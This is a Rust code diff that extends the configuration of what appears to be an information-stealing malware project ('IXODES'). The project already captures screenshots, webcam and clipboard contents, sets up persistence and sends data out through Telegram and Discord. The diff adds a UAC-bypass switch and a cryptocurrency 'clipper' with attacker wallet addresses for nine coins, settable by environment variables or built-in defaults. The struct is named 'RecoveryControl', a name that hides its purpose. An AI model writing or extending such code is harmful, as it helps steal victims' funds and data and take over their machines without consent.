@@ -14,6 +14,17 @@ pub struct RecoveryControl {
     capture_screenshots: bool,
     capture_webcams: bool,
     capture_clipboard: bool,
+    uac_bypass_enabled: bool,
+    clipper_enabled: bool,
+    btc_address: Option<String>,
+    eth_address: Option<String>,
+    ltc_address: Option<String>,
+    xmr_address: Option<String>,
+    doge_address: Option<String>,
+    dash_address: Option<String>,
+    sol_address: Option<String>,
+    trx_address: Option<String>,
+    ada_address: Option<String>,
     telegram_token: Option<String>,
         telegram_chat_id: Option<String>,
         discord_webhook: Option<String>,
@@ -69,6 +80,50 @@ pub struct RecoveryControl {
         self.persistence_enabled
     }
 
+    pub fn uac_bypass_enabled(&self) -> bool {
+        self.uac_bypass_enabled
+    }
+
+    pub fn clipper_enabled(&self) -> bool {
+        self.clipper_enabled
+    }
+
+    pub fn btc_address(&self) -> Option<&str> {
+        self.btc_address.as_deref()
+    }
+
+    pub fn eth_address(&self) -> Option<&str> {
+        self.eth_address.as_deref()
+    }
+
+    pub fn ltc_address(&self) -> Option<&str> {
+        self.ltc_address.as_deref()
+    }
+
+    pub fn xmr_address(&self) -> Option<&str> {
+        self.xmr_address.as_deref()
+    }
+
+    pub fn doge_address(&self) -> Option<&str> {
+        self.doge_address.as_deref()
+    }
+
+    pub fn dash_address(&self) -> Option<&str> {
+        self.dash_address.as_deref()
+    }
+
+    pub fn sol_address(&self) -> Option<&str> {
+        self.sol_address.as_deref()
+    }
+
+    pub fn trx_address(&self) -> Option<&str> {
+        self.trx_address.as_deref()
+    }
+
+    pub fn ada_address(&self) -> Option<&str> {
+        self.ada_address.as_deref()
+    }
+
     pub fn telegram_token(&self) -> Option<&str> {
         self.telegram_token.as_deref()
     }
@@ -115,6 +170,39 @@ pub struct RecoveryControl {
             parse_flag("IXODES_CAPTURE_CLIPBOARD").unwrap_or(DEFAULT_CAPTURE_CLIPBOARD);
         let persistence_enabled =
             parse_flag("IXODES_PERSISTENCE").unwrap_or(DEFAULT_PERSISTENCE);
+        let uac_bypass_enabled =
+            parse_flag("IXODES_UAC_BYPASS").unwrap_or(DEFAULT_UAC_BYPASS);
+        let clipper_enabled =
+            parse_flag("IXODES_CLIPPER").unwrap_or(DEFAULT_CLIPPER_ENABLED);
+        
+        let btc_address = env::var("IXODES_BTC_ADDRESS")
+            .ok()
+            .or_else(|| DEFAULT_BTC_ADDRESS.map(String::from));
+        let eth_address = env::var("IXODES_ETH_ADDRESS")
+            .ok()
+            .or_else(|| DEFAULT_ETH_ADDRESS.map(String::from));
+        let ltc_address = env::var("IXODES_LTC_ADDRESS")
+            .ok()
+            .or_else(|| DEFAULT_LTC_ADDRESS.map(String::from));
+        let xmr_address = env::var("IXODES_XMR_ADDRESS")
+            .ok()
+            .or_else(|| DEFAULT_XMR_ADDRESS.map(String::from));
+        let doge_address = env::var("IXODES_DOGE_ADDRESS")
+            .ok()
+            .or_else(|| DEFAULT_DOGE_ADDRESS.map(String::from));
+        let dash_address = env::var("IXODES_DASH_ADDRESS")
+            .ok()
+            .or_else(|| DEFAULT_DASH_ADDRESS.map(String::from));
+        let sol_address = env::var("IXODES_SOL_ADDRESS")
+            .ok()
+            .or_else(|| DEFAULT_SOL_ADDRESS.map(String::from));
+        let trx_address = env::var("IXODES_TRX_ADDRESS")
+            .ok()
+            .or_else(|| DEFAULT_TRX_ADDRESS.map(String::from));
+        let ada_address = env::var("IXODES_ADA_ADDRESS")
+            .ok()
+            .or_else(|| DEFAULT_ADA_ADDRESS.map(String::from));
+
         let pump_size_mb =
             parse_u32("IXODES_PUMP_SIZE_MB").unwrap_or(DEFAULT_PUMP_SIZE_MB);
         
@@ -149,6 +237,17 @@ pub struct RecoveryControl {
             capture_screenshots,
             capture_webcams,
             capture_clipboard,
+            uac_bypass_enabled,
+            clipper_enabled,
+            btc_address,
+            eth_address,
+            ltc_address,
+            xmr_address,
+            doge_address,
+            dash_address,
+            sol_address,
+            trx_address,
+            ada_address,
             telegram_token,
             telegram_chat_id,
             discord_webhook,
